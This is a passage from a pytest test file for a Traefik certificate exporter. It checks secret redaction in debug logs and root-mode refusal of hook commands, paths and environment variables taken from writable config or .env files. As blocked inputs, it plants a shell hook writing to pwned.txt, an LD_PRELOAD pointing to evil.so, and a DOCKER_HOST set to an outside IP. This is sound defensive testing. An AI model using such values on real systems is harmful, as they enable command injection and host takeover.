import logging

import pytest

from traefik_certificate_exporter.libs.settings import (
    Settings,
    SettingsManager,
    _redact_secrets,
)


def _make_settings(passphrase: str | None = "super-secret-value") -> Settings:
    return Settings(
        dataPath="/data",
        fileSpec="*.json",
        outputPath="/certs",
        resolverInPathName=False,
        traefikResolverId="myresolver",
        flat=False,
        dryRun=False,
        restartContainers=False,
        domains={"include": [], "exclude": []},
        watchForChanges=False,
        runAtStart=False,
        watchInterval=60,
        pkcs12Passphrase=passphrase,
    )


def test_redact_secrets_masks_known_secret_keys():
    redacted = _redact_secrets({"pkcs12Passphrase": "hunter2", "dataPath": "/data"})

    assert redacted["pkcs12Passphrase"] == "***REDACTED***"
    assert redacted["dataPath"] == "/data"


def test_redact_secrets_matches_by_name_not_a_hardcoded_field_list():
    # A brand-new secret-shaped field (never referenced by settings.py) must still be
    # redacted, proving the match is name/allowlist-based rather than per-field.
    redacted = _redact_secrets({"someFutureApiToken": "abc123", "count": 3})

    assert redacted["someFutureApiToken"] == "***REDACTED***"
    assert redacted["count"] == 3


def test_an_unset_secret_renders_as_null_rather_than_redacted():
    """UX-001: masking by key alone told an operator a credential they never configured
    was populated. The absence of a credential is not a credential."""
    redacted = _redact_secrets({"pkcs12Passphrase": None})

    assert redacted["pkcs12Passphrase"] is None


def test_redact_secrets_handles_absent_key_without_raising():
    redacted = _redact_secrets({"dataPath": "/data"})

    assert "pkcs12Passphrase" not in redacted


def test_dump_settings_never_logs_passphrase_verbatim(caplog):
    passphrase = "s3cr3t-passphrase-value"
    manager = SettingsManager()
    manager.settings = _make_settings(passphrase=passphrase)

    with caplog.at_level(logging.DEBUG):
        manager._dump_settings()

    assert passphrase not in caplog.text
    assert "***REDACTED***" in caplog.text


def test_dump_settings_with_no_passphrase_does_not_raise(caplog):
    manager = SettingsManager()
    manager.settings = _make_settings(passphrase=None)

    with caplog.at_level(logging.DEBUG):
        manager._dump_settings()


def test_command_line_args_are_redacted_before_they_reach_the_log(caplog, tmp_path):
    """The raw argparse namespace was logged verbatim at DEBUG.

    `--pkcs12-passphrase` is a command-line flag, so the credential appeared in full in
    the log line that announces the CLI source -- a few lines above the dump helpers that
    take care to mask exactly that field. Redacting one source and printing another is a
    leak, not a partial win.
    """
    import logging
    from argparse import Namespace

    from traefik_certificate_exporter.libs.settings import SettingsManager

    args = Namespace(
        configfile=str(tmp_path / "absent.yaml"),
        **{"settings.pkcs12passphrase": "hunter2", "settings.datapath": str(tmp_path)},
    )

    with caplog.at_level(logging.DEBUG):
        SettingsManager().loadFromFile(
            fileName=str(tmp_path / "absent.yaml"), cmdLineArgs=args
        )

    leaked = [r.getMessage() for r in caplog.records if "hunter2" in r.getMessage()]
    assert not leaked, f"the passphrase reached the log: {leaked}"


# ---------------------------------------------------------------------------
# /config trust-boundary invariant has no runtime enforcement (EC-002, epic-011 closure
# red-team). `loadFromFile` documents the mount as trusted but never checked; these prove
# the WARNING fires on an actually-writable file and stays silent on a safe one.
# ---------------------------------------------------------------------------


def test_loadfromfile_warns_when_the_config_file_is_world_writable(tmp_path, caplog):
    import logging
    import os
    import stat

    from traefik_certificate_exporter.libs.settings import SettingsManager

    cfg = tmp_path / "config.yaml"
    cfg.write_text("settings:\n  datapath: /data\n")
    os.chmod(cfg, stat.S_IRUSR | stat.S_IWUSR | stat.S_IWOTH)

    with caplog.at_level(logging.WARNING):
        SettingsManager().loadFromFile(fileName=str(cfg))

    warnings = [r.getMessage() for r in caplog.records if r.levelno == logging.WARNING]
    assert any("group- or world-writable" in m and str(cfg) in m for m in warnings), (
        f"expected a writable-mount warning naming {cfg}, got: {warnings}"
    )


def test_loadfromfile_does_not_warn_when_the_config_file_is_not_writable_by_others(
    tmp_path, caplog
):
    import logging
    import os
    import stat

    from traefik_certificate_exporter.libs.settings import SettingsManager

    cfg = tmp_path / "config.yaml"
    cfg.write_text("settings:\n  datapath: /data\n")
    os.chmod(cfg, stat.S_IRUSR | stat.S_IWUSR)

    with caplog.at_level(logging.WARNING):
        SettingsManager().loadFromFile(fileName=str(cfg))

    warnings = [r.getMessage() for r in caplog.records if r.levelno == logging.WARNING]
    assert not any("group- or world-writable" in m for m in warnings)


def _capture_all_records(caplog, tmp_path, config_text, cli_overrides):
    """Run a full load at DEBUG and return every message emitted.

    Asserted over everything captured rather than over named dump functions, because the
    leak this closes was in neither of them -- it was the raw argparse namespace, logged a
    few lines above the helpers that redact.
    """
    import logging
    from argparse import Namespace

    from traefik_certificate_exporter.libs.settings import SettingsManager

    cfg = tmp_path / "config.yaml"
    cfg.write_text(config_text)
    args = Namespace(configfile=str(cfg), **cli_overrides)

    with caplog.at_level(logging.DEBUG):
        manager = SettingsManager()
        manager.loadFromFile(fileName=str(cfg), cmdLineArgs=args)
        manager._dump_config()
        manager._dump_settings()

    return "\n".join(r.getMessage() for r in caplog.records)


def test_every_declared_secret_key_is_redacted_in_every_sink(caplog, tmp_path):
    """Scope comes from the registry, so a new declaration is covered with no edit here."""
    from traefik_certificate_exporter.libs.settings import SECRET_CONFIG_KEYS

    assert SECRET_CONFIG_KEYS, "no secret paths declared; this guard examined nothing"

    for config_key in SECRET_CONFIG_KEYS:
        assert config_key[0] == "settings", f"unhandled key shape: {config_key}"
        key = config_key[-1]
        planted = f"PLANTED-{key.upper()}"
        captured = _capture_all_records(
            caplog,
            tmp_path,
            f"settings:\n  {key}: {planted}\n  datapath: {tmp_path}\n",
            {f"settings.{key}": planted, "settings.datapath": str(tmp_path)},
        )
        assert planted not in captured, (
            f"{'.'.join(config_key)} reached a log record at DEBUG"
        )
        caplog.clear()


def test_a_newly_declared_secret_is_covered_without_touching_the_guard(
    caplog, tmp_path, monkeypatch
):
    """The plant attacks the SCOPE, not the rule.

    `destinationlist` matches none of `_SECRET_FIELD_PATTERN`'s words, so nothing about
    its *name* makes it a secret -- only its presence in the registry does. If redaction
    ever stops deriving from that registry, this fails while a name-shaped case would
    still pass, which is the whole point.
    """
    from traefik_certificate_exporter.libs import settings as settings_module

    monkeypatch.setattr(
        settings_module,
        "SECRET_CONFIG_KEYS",
        (*settings_module.SECRET_CONFIG_KEYS, ("settings", "destinationlist")),
    )
    settings_module._secret_leaf_names.cache_clear()

    planted = "PLANTED-BY-PATH-NOT-BY-NAME"
    captured = _capture_all_records(
        caplog,
        tmp_path,
        f"settings:\n  destinationlist: {planted}\n  datapath: {tmp_path}\n",
        # Passed on the command line as well, so the argparse-namespace sink -- the one
        # that was actually leaking -- is exercised. Through the config file alone this
        # test is satisfied by confuse's own path redaction and proves nothing about
        # whether `_redact_secrets` consults the registry.
        {"settings.destinationlist": planted, "settings.datapath": str(tmp_path)},
    )
    settings_module._secret_leaf_names.cache_clear()

    assert not settings_module._SECRET_FIELD_PATTERN.search("destinationlist"), (
        "pick a name the pattern cannot catch, or this proves nothing about the registry"
    )
    assert planted not in captured, (
        "a declared secret path was not redacted -- redaction is not deriving its scope "
        "from SECRET_CONFIG_KEYS"
    )


def test_a_secret_nested_in_a_list_of_objects_is_redacted():
    """The shape neither existing guard exercises (BL-E010-003).

    `_dump_config` redacts by config PATH, which reaches `appriseurls` -- a list of raw
    strings -- without ever descending into it. `_dump_settings` serialises the `Settings`
    dataclass instead, so it redacts by where a declared leaf name sits in the walked
    structure. A declared secret held one level deeper, inside objects *within* a list,
    is the position that tests neither: the list recursion has to run, and then the
    declared-key check has to fire on the dict inside it.
    """
    from traefik_certificate_exporter.libs.settings import (
        _REDACTED_VALUE,
        _redact_secrets,
    )

    redacted = _redact_secrets(
        {
            "destinations": [
                {"name": "primary", "pkcs12Passphrase": "PLANTED-IN-A-LIST"},
                {"name": "secondary", "appriseUrls": ["tgram://PLANTED-TOKEN/chat"]},
            ]
        }
    )

    assert redacted["destinations"][0]["pkcs12Passphrase"] == _REDACTED_VALUE
    # Per element, keeping only the scheme (BL-E011-033, E014-S01-008).
    assert redacted["destinations"][1]["appriseUrls"] == [f"tgram://{_REDACTED_VALUE}"]
    assert "PLANTED" not in repr(redacted)
    assert redacted["destinations"][0]["name"] == "primary", (
        "redaction must not flatten non-secret siblings"
    )


def test_an_undeclared_credential_shaped_name_in_a_nested_list_is_still_caught():
    """The backstop pattern has to survive the same nesting the registry check does."""
    from traefik_certificate_exporter.libs.settings import (
        _REDACTED_VALUE,
        _redact_secrets,
    )

    redacted = _redact_secrets([[{"api_key": "PLANTED-UNDECLARED"}]])

    assert redacted[0][0]["api_key"] == _REDACTED_VALUE


# ---------------------------------------------------------------------------
# UX-001: redaction is value-aware. An operator who raises `-ll DEBUG` to answer "is my
# notification/passphrase config actually loading?" was told, falsely, that both were
# populated -- and the two sinks disagreed with each other about the same unset field.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("key", ["pkcs12passphrase", "appriseurls"])
def test_an_unset_declared_secret_is_not_reported_as_configured(caplog, tmp_path, key):
    captured = _capture_all_records(
        caplog,
        tmp_path,
        f"settings:\n  datapath: {tmp_path}\n",
        {"settings.datapath": str(tmp_path)},
    )

    assert "REDACTED" not in captured, (
        f"an unconfigured '{key}' was reported as a populated credential:\n{captured}"
    )


@pytest.mark.parametrize("key", ["pkcs12passphrase", "appriseurls"])
def test_an_empty_declared_secret_is_not_reported_as_configured(caplog, tmp_path, key):
    """Explicitly present but empty -- `pkcs12passphrase: ""` / `appriseurls: []`."""
    empty = '""' if key == "pkcs12passphrase" else "[]"
    captured = _capture_all_records(
        caplog,
        tmp_path,
        f"settings:\n  {key}: {empty}\n  datapath: {tmp_path}\n",
        {
            f"settings.{key}": "" if key == "pkcs12passphrase" else [],
            "settings.datapath": str(tmp_path),
        },
    )

    assert "REDACTED" not in captured, (
        f"an empty '{key}' was reported as a populated credential:\n{captured}"
    )


@pytest.mark.parametrize("key", ["pkcs12passphrase", "appriseurls"])
def test_a_set_declared_secret_is_still_masked_in_every_sink(caplog, tmp_path, key):
    planted = f"PLANTED-{key.upper()}"
    value = planted if key == "pkcs12passphrase" else f"[{planted}]"
    captured = _capture_all_records(
        caplog,
        tmp_path,
        f"settings:\n  {key}: {value}\n  datapath: {tmp_path}\n",
        {
            f"settings.{key}": planted if key == "pkcs12passphrase" else [planted],
            "settings.datapath": str(tmp_path),
        },
    )

    assert planted not in captured, f"settings.{key} reached a log record at DEBUG"
    assert "REDACTED" in captured, "a configured credential was not masked at all"


def test_both_dump_sinks_agree_that_an_unset_secret_is_absent(caplog, tmp_path):
    """They disagreed: confuse omitted the unset passphrase while the settings dump
    printed `***REDACTED***` for it, so the operator read "absent here, set there"."""
    import logging as _logging
    from argparse import Namespace

    from traefik_certificate_exporter.libs.settings import SettingsManager

    cfg = tmp_path / "config.yaml"
    cfg.write_text(f"settings:\n  datapath: {tmp_path}\n")

    with caplog.at_level(_logging.DEBUG):
        manager = SettingsManager()
        manager.loadFromFile(
            fileName=str(cfg),
            cmdLineArgs=Namespace(
                configfile=str(cfg), **{"settings.datapath": str(tmp_path)}
            ),
        )
        caplog.clear()
        manager._dump_config()
        configDump = "\n".join(r.getMessage() for r in caplog.records)
        caplog.clear()
        manager._dump_settings()
        settingsDump = "\n".join(r.getMessage() for r in caplog.records)

    assert "REDACTED" not in configDump, configDump
    assert "REDACTED" not in settingsDump, settingsDump
    assert manager.settings.pkcs12Passphrase is None
    assert manager.settings.appriseUrls == []


def test_an_empty_secret_value_is_recognised_but_zero_is_not():
    from traefik_certificate_exporter.libs.settings import _is_empty_secret

    assert _is_empty_secret(None)
    assert _is_empty_secret("")
    assert _is_empty_secret([])
    assert not _is_empty_secret("hunter2")
    assert not _is_empty_secret(["tgram://token/"])
    assert not _is_empty_secret(0), "0 is not credential-shaped emptiness"
    assert not _is_empty_secret(False)


# ---------------------------------------------------------------------------
# E014-S01-004: config_default.yaml declares every key, secrets included, as `null`.
# Declaring a secret must not make it look configured, and a DEBUG level raised from the
# environment (the container's only switch) must not unmask an env-set passphrase.
# ---------------------------------------------------------------------------


def _clear_tce_env(monkeypatch):
    import os

    for name in list(os.environ):
        if name.startswith("TRAEFIK_CERTIFICATE_EXPORTER_"):
            monkeypatch.delenv(name)


def test_declared_null_secret_is_not_redacted_as_present(caplog, tmp_path, monkeypatch):
    from argparse import Namespace

    _clear_tce_env(monkeypatch)
    monkeypatch.chdir(tmp_path)
    with caplog.at_level(logging.DEBUG):
        manager = SettingsManager()
        manager.loadFromFile(
            fileName=str(tmp_path / "absent.yaml"),
            cmdLineArgs=Namespace(**{"settings.datapath": str(tmp_path)}),
        )
        caplog.clear()
        manager._dump_config()
    dump = "\n".join(r.getMessage() for r in caplog.records)

    passphrase_lines = [
        line
        for line in dump.splitlines()
        if line.strip().startswith("pkcs12passphrase:")
    ]
    assert passphrase_lines, f"the declared key is missing from the dump:\n{dump}"
    assert "REDACTED" not in passphrase_lines[0], passphrase_lines[0]
    assert passphrase_lines[0].split(":", 1)[1].strip() in ("", "null"), (
        passphrase_lines
    )
    assert manager.settings.pkcs12Passphrase is None
    assert manager.settings.traefikResolverId is None
    assert manager.settings.postExportCommand is None


def test_passphrase_from_env_is_masked_when_log_level_comes_from_env(
    caplog, tmp_path, monkeypatch
):
    from argparse import Namespace

    from traefik_certificate_exporter import app

    _clear_tce_env(monkeypatch)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setenv("TRAEFIK_CERTIFICATE_EXPORTER_LOGGING_LEVEL", "debug")
    monkeypatch.setenv(
        "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_PKCS12PASSPHRASE", "PLANTED-ENV-SECRET"
    )

    level = app._resolve_log_level(None)
    assert level == "DEBUG"

    with caplog.at_level(level):
        manager = SettingsManager()
        manager.loadFromFile(
            fileName=str(tmp_path / "absent.yaml"),
            cmdLineArgs=Namespace(**{"settings.datapath": str(tmp_path)}),
        )
    captured = "\n".join(r.getMessage() for r in caplog.records)

    assert manager.settings.pkcs12Passphrase == "PLANTED-ENV-SECRET"
    assert "PLANTED-ENV-SECRET" not in captured
    assert "REDACTED" in captured


# ---------------------------------------------------------------------------
# E014-S01-010 (review-product m4): `postexportcommand` is a declared secret. A hook
# command often carries a credential (`curl -H "Authorization: …"`).
# ---------------------------------------------------------------------------

_CREDENTIAL_COMMAND = 'curl -H "Authorization: Bearer s3cr3t" https://x.example.test'


def test_postexportcommand_is_redacted_in_debug_dumps(caplog, tmp_path, monkeypatch):
    _clear_tce_env(monkeypatch)
    captured = _capture_all_records(
        caplog,
        tmp_path,
        f"settings:\n  postexportcommand: '{_CREDENTIAL_COMMAND}'\n"
        f"  datapath: {tmp_path}\n",
        {
            "settings.postexportcommand": _CREDENTIAL_COMMAND,
            "settings.datapath": str(tmp_path),
        },
    )

    assert "s3cr3t" not in captured, captured
    assert "Authorization" not in captured, captured
    assert "REDACTED" in captured, "a configured hook command was not masked at all"


def test_unset_postexportcommand_dumps_as_null_not_redacted(
    caplog, tmp_path, monkeypatch
):
    """`config_default.yaml` declares the key `null` (E014-S01-004): declaring it a secret
    must not make an unset command look configured, in either dump."""
    from argparse import Namespace

    _clear_tce_env(monkeypatch)
    monkeypatch.chdir(tmp_path)
    with caplog.at_level(logging.DEBUG):
        manager = SettingsManager()
        manager.loadFromFile(
            fileName=str(tmp_path / "absent.yaml"),
            cmdLineArgs=Namespace(**{"settings.datapath": str(tmp_path)}),
        )
        caplog.clear()
        manager._dump_config()
        configDump = "\n".join(r.getMessage() for r in caplog.records)
        caplog.clear()
        manager._dump_settings()
        settingsDump = "\n".join(r.getMessage() for r in caplog.records)

    commandLines = [
        line
        for line in configDump.splitlines()
        if line.strip().startswith("postexportcommand:")
    ]
    assert commandLines, f"the declared key is missing from the dump:\n{configDump}"
    assert commandLines[0].split(":", 1)[1].strip() in ("", "null"), commandLines
    assert '"postExportCommand": null' in settingsDump, settingsDump
    assert manager.settings.postExportCommand is None


def test_every_config_default_key_is_read_by_the_loader(tmp_path, monkeypatch):
    """The other direction of the key registry (review F1, E014-S01-004).

    The CLI dest and documented env-name checks prove a name is declared in
    config_default.yaml. This proves the declared set equals what `loadFromFile` actually
    reads, by recording every confuse view the loader opens -- so a key the loader stops
    reading, or reads under another spelling, fails here instead of turning a flag or env
    var silently into a no-op (the M1 failure mode).
    """
    from argparse import Namespace
    from pathlib import Path

    import confuse
    import yaml

    registry_file = (
        Path(__file__).resolve().parents[2]
        / "src"
        / "traefik_certificate_exporter"
        / "config_default.yaml"
    )
    declared: set[str] = set()
    leaves: set[str] = set()

    def walk(node, name):
        if name:
            declared.add(name)
        if isinstance(node, dict):
            for key, value in node.items():
                walk(value, f"{name}.{key}" if name else str(key))
        elif name:
            leaves.add(name)

    walk(yaml.safe_load(registry_file.read_text("utf-8")), "")
    assert leaves, (
        "config_default.yaml declares no settings; this guard examined nothing"
    )

    opened: set[str] = set()
    original_init = confuse.Subview.__init__

    def recording_init(self, parent, key):
        original_init(self, parent, key)
        opened.add(self.name)

    _clear_tce_env(monkeypatch)
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(confuse.Subview, "__init__", recording_init)
    # Secret-marking and the config dump open paths on their own (the dump walks every
    # key), which would make this pass vacuously; only the Settings build counts.
    monkeypatch.setattr(SettingsManager, "_mark_present_secrets", lambda self: None)
    monkeypatch.setattr(SettingsManager, "_dump_config", lambda self: None)

    SettingsManager().loadFromFile(
        fileName=str(tmp_path / "absent.yaml"),
        cmdLineArgs=Namespace(**{"settings.datapath": str(tmp_path)}),
    )

    assert not leaves - opened, (
        f"declared in config_default.yaml but never read by the loader: "
        f"{sorted(leaves - opened)}"
    )
    assert not opened - declared, (
        f"read by the loader but not declared in config_default.yaml: "
        f"{sorted(opened - declared)}"
    )


# ---------------------------------------------------------------------------
# Per-element redaction of a declared-secret list, and a legible settings dump
# (BL-E011-033, BL-E011-036, E014-S01-008).
# ---------------------------------------------------------------------------


def test_secret_list_is_redacted_per_element_keeping_scheme():
    """An operator must still see how many targets are configured and of what kind."""
    redacted = _redact_secrets(
        {"appriseUrls": ["tgram://123:abc/456", "mailto://u:pw@host", "weird"]}
    )

    assert redacted["appriseUrls"] == [
        "tgram://***REDACTED***",
        "mailto://***REDACTED***",
        "***REDACTED***",
    ]
    rendered = repr(redacted)
    for secret in ("123:abc", "pw", "weird", "456", "host"):
        assert secret not in rendered


def test_secret_list_non_string_and_empty_elements_are_safe():
    redacted = _redact_secrets(
        {"appriseUrls": [{"url": "tgram://1:a/2"}, 42, "", "1nvalid://x"]}
    )

    # A digit cannot start an RFC 3986 scheme, so the last element has none to keep.
    assert redacted["appriseUrls"] == [
        "***REDACTED***",
        "***REDACTED***",
        "",
        "***REDACTED***",
    ]
    assert _redact_secrets({"appriseUrls": []}) == {"appriseUrls": []}


def _dump_settings_records(caplog, settings: Settings) -> list[str]:
    manager = SettingsManager()
    manager.settings = settings
    with caplog.at_level(logging.DEBUG):
        manager._dump_settings()
    return [record.getMessage() for record in caplog.records]


def test_settings_dump_is_multiline_json_that_round_trips(caplog):
    import json

    import jsonpickle

    settings = _make_settings()
    settings.appriseUrls = ["tgram://123:abc/456", "mailto://u:pw@host"]

    messages = _dump_settings_records(caplog, settings)
    dump = next(m for m in messages if m.lstrip().startswith("{"))

    assert len(dump.splitlines()) > 1
    expected = _redact_secrets(
        json.loads(jsonpickle.dumps(settings, unpicklable=False))
    )
    assert json.loads(dump) == expected
    assert json.loads(dump)["appriseUrls"] == [
        "tgram://***REDACTED***",
        "mailto://***REDACTED***",
    ]


def test_settings_dump_omits_raw_passphrase(caplog):
    passphrase = "pfx-Passphrase-4711"

    messages = _dump_settings_records(caplog, _make_settings(passphrase=passphrase))

    assert messages
    assert all(passphrase not in message for message in messages)


# ---------------------------------------------------------------------------
# E015-S01-001 (BL-E014-119, ADR-0049): a root process takes `postexportcommand`,
# `outputpath` and `datapath` only from the environment, the command line or the packaged
# default -- never from a file the service account can rewrite. `filespec` is a file-name
# glob inside `datapath` in every mode. Every test sets the euid it means through
# `settings.os.geteuid`, so the suite gives the same answer under any runner uid.
# ---------------------------------------------------------------------------

_HOOK_ENV = "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_POSTEXPORTCOMMAND"
_OUTPUT_ENV = "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_OUTPUTPATH"
_DATA_ENV = "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_DATAPATH"
_FILESPEC_ENV = "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_FILESPEC"
_FILE_HOOK = "/bin/sh -c 'id > /certs/pwned.txt'"


def _isolate_loader(monkeypatch, tmp_path, euid: int):
    """Point every file the loader can read into `tmp_path` and fix the euid.

    Returns (config file, user config file, cwd `.env`, module `.env`), none created. The
    names a `.env` file may add to `os.environ` are registered with monkeypatch first, so
    `load_dotenv`'s writes are undone after the test.
    """
    from traefik_certificate_exporter.libs import settings as settings_module

    tmp_path.mkdir(parents=True, exist_ok=True)
    _clear_tce_env(monkeypatch)
    for name in (_HOOK_ENV, _OUTPUT_ENV, _DATA_ENV, _FILESPEC_ENV):
        monkeypatch.setenv(name, "placeholder")
        monkeypatch.delenv(name)
    monkeypatch.delenv("XDG_CONFIG_HOME", raising=False)
    monkeypatch.delenv("TRAEFIK_CERTIFICATE_EXPORTERDIR", raising=False)
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    cwd = tmp_path / "cwd"
    cwd.mkdir()
    monkeypatch.chdir(cwd)
    module = tmp_path / "module"
    module.mkdir()
    monkeypatch.setattr(settings_module.os, "geteuid", lambda: euid, raising=False)
    userConfig = home / ".config" / "traefik_certificate_exporter" / "config.yaml"
    return tmp_path / "config.yaml", userConfig, cwd / ".env", module / ".env"


def _load_as(monkeypatch, tmp_path, *, euid, config=None, env=None, cli=None):
    """One full `loadFromFile` under the given euid; returns the manager."""
    from argparse import Namespace

    configFile, _user, _cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, euid)
    if config is not None:
        configFile.write_text(config, encoding="utf-8")
    for name, value in (env or {}).items():
        monkeypatch.setenv(name, value)
    manager = SettingsManager()
    manager.modulePath = moduleEnv.parent
    manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace(**(cli or {})))
    return manager


def _messages(caplog, level=logging.INFO) -> list[str]:
    return [r.getMessage() for r in caplog.records if r.levelno >= level]


def _errors(caplog) -> list[str]:
    return [r.getMessage() for r in caplog.records if r.levelno == logging.ERROR]


def test_root_ignores_a_postexportcommand_from_the_config_file(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=0,
            config=f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n',
        )

    assert manager.settings.postExportCommand is None
    assert any("settings.postexportcommand" in m for m in _errors(caplog))


def test_root_ignores_an_outputpath_from_the_config_file_and_keeps_the_environment_value(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=0,
            config="settings:\n  outputpath: /config/elsewhere\n",
            env={_OUTPUT_ENV: "/certs"},
        )

    assert manager.settings.outputPath == "/certs"
    # The environment already wins, so nothing is withheld and nothing is reported.
    assert _errors(caplog) == []

    caplog.clear()
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path / "file-only",
            euid=0,
            config="settings:\n  outputpath: /config/elsewhere\n",
        )

    assert manager.settings.outputPath == "./certs"
    assert any("settings.outputpath" in m for m in _errors(caplog))


def test_root_ignores_a_datapath_from_the_config_file_and_keeps_the_environment_value(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=0,
            config="settings:\n  datapath: /config\n",
            env={_DATA_ENV: "/data"},
        )

    assert manager.settings.dataPath == "/data"
    assert _errors(caplog) == []

    caplog.clear()
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path / "file-only",
            euid=0,
            config="settings:\n  datapath: /config\n",
        )

    assert manager.settings.dataPath == "./data"
    errors = _errors(caplog)
    assert len(errors) == 1, errors
    assert "settings.datapath" in errors[0]
    assert _DATA_ENV in errors[0]


def test_root_takes_postexportcommand_from_the_environment(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=0,
            config=f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n',
            env={_HOOK_ENV: "/usr/local/bin/reload --env"},
        )

    assert manager.settings.postExportCommand == "/usr/local/bin/reload --env"
    assert _errors(caplog) == []


def test_root_takes_postexportcommand_from_the_command_line(
    caplog, tmp_path, monkeypatch
):
    with caplog.at_level(logging.INFO):
        manager = _load_as(
            monkeypatch,
            tmp_path,
            euid=0,
            config=f'settings:\n  postexportcommand: "{_FILE_HOOK}"\n',
            cli={"settings.postexportcommand": "/usr/local/bin/reload --cli"},
        )

    assert manager.settings.postExportCommand == "/usr/local/bin/reload --cli"
    assert _errors(caplog) == []


@pytest.mark.parametrize("where", ["cwd_env", "module_env"])
def test_root_ignores_an_environment_only_key_set_by_a_dotenv_file(
    caplog, tmp_path, monkeypatch, where
):
    import os
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, 0)
    dotenv = cwdEnv if where == "cwd_env" else moduleEnv
    # Lower-case spelling too: confuse lower-cases the tail of the name, so this one
    # would reach the setting just the same.
    dotenv.write_text(
        f'{_HOOK_ENV}="{_FILE_HOOK}"\n'
        "traefik_certificate_exporter_settings_outputpath=/config/out\n"
        "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_FLAT=true\n",
        encoding="utf-8",
    )
    monkeypatch.setenv("TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_FLAT", "x")
    monkeypatch.delenv("TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_FLAT")
    monkeypatch.setenv("traefik_certificate_exporter_settings_outputpath", "x")
    monkeypatch.delenv("traefik_certificate_exporter_settings_outputpath")

    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())

    assert manager.settings.postExportCommand is None
    assert _HOOK_ENV not in os.environ
    assert "traefik_certificate_exporter_settings_outputpath" not in os.environ
    # An `any-source` key still loads from the `.env` file.
    assert manager.settings.flat is True
    errors = _errors(caplog)
    assert any(
        "settings.postexportcommand" in m and f".env file '{dotenv}'" in m
        for m in errors
    ), errors
    assert not any(_FILE_HOOK in m for m in _messages(caplog))


def test_root_keeps_a_dotenv_key_the_real_environment_already_set(
    caplog, tmp_path, monkeypatch
):
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, 0)
    cwdEnv.write_text(f'{_HOOK_ENV}="{_FILE_HOOK}"\n', encoding="utf-8")
    monkeypatch.setenv(_HOOK_ENV, "/usr/local/bin/reload --real-env")

    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())

    assert manager.settings.postExportCommand == "/usr/local/bin/reload --real-env"
    assert _errors(caplog) == []


# F1 (review E015-S01-001): in root mode a `.env` file may add only the variables of
# `any-source` settings. Anything else it adds -- a loader variable, the Docker endpoint,
# a logging key -- would reach root's environment and the hook root runs.
_DOTENV_PLANTED = {
    "LD_PRELOAD": "/config/evil.so",
    "DOCKER_HOST": "tcp://203.0.113.9:2375",
    "TRAEFIK_CERTIFICATE_EXPORTER_LOGGING_CFGFILE": "/config/evil-logging.yaml",
}
_DRYRUN_ENV = "TRAEFIK_CERTIFICATE_EXPORTER_SETTINGS_DRYRUN"


def _load_with_planted_dotenv(caplog, monkeypatch, tmp_path, euid, where="cwd_env"):
    from argparse import Namespace

    configFile, _user, cwdEnv, moduleEnv = _isolate_loader(monkeypatch, tmp_path, euid)
    dotenv = cwdEnv if where == "cwd_env" else moduleEnv
    for name in (*_DOTENV_PLANTED, _DRYRUN_ENV):
        # Registered with monkeypatch so whatever `load_dotenv` adds is undone.
        monkeypatch.setenv(name, "placeholder")
        monkeypatch.delenv(name)
    dotenv.write_text(
        "".join(f"{name}={value}\n" for name, value in _DOTENV_PLANTED.items())
        + f"{_DRYRUN_ENV}=true\n",
        encoding="utf-8",
    )
    with caplog.at_level(logging.INFO):
        manager = SettingsManager()
        manager.modulePath = moduleEnv.parent
        manager.loadFromFile(fileName=str(configFile), cmdLineArgs=Namespace())
    return manager, dotenv


@pytest.mark.parametrize("where", ["cwd_env", "module_env"])
def test_root_drops_every_dotenv_variable_that_is_not_an_any_source_setting(
    caplog, tmp_path, monkeypatch, where
):
    import os

    manager, dotenv = _load_with_planted_dotenv(caplog, monkeypatch, tmp_path, 0, where)

    for name in _DOTENV_PLANTED:
        assert name not in os.environ, name
    # An `any-source` setting still loads from the `.env` file.
    assert os.environ.get(_DRYRUN_ENV) == "true"
    assert manager.settings.dryRun is True
    # One ERROR for the file, naming every removed variable and none of the values.
    errors = [m for m in _errors(caplog) if f".env file '{dotenv}'" in m]
    assert len(errors) == 1, _errors(caplog)
    for name in _DOTENV_PLANTED:
        assert name in errors[0], errors[0]
    assert _DRYRUN_ENV not in errors[0]
    assert "container's environment" in errors[0]
    assert "ADR-0049" in errors[0]
    for value in _DOTENV_PLANTED.values():
        assert not any(value in m for m in _messages(caplog, logging.DEBUG)), value


# E015-S01-004: a legacy name (a pre-confuse 0.0.x name or a prefixed one) sets nothing in
# any mode. In root mode a `.env` file that adds one still has it removed, but it is
# reported once, by the legacy warning that names its replacement -- not by the root-mode
# ERROR, whose advice (move it to the container's environment) would set nothing either.
_DOTENV_LEGACY = {
